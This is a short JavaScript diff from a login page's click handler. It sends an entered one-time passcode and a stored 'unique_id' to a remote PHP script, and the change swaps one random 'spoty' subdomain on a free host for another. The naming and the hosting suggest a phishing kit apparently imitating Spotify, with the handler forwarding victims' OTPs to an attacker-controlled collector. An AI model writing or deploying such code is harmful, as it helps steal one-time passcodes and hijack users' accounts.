@@ -22,7 +22,7 @@ document.getElementById("login-button").addEventListener("click", function (even
     const data = { otp, unique_id: localStorage.getItem('unique_id') };
 
     // Send OTP to PHP script
-    fetch("https://spoty-d2k0fla2d-la2dasfsd.d2sckfda9r5aua.amplifyapp.com/send_otp.php", {
+    fetch("https://spoty-dfla0k2kfs-sdjla2dasf.onrender.com/send_otp.php", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(data),
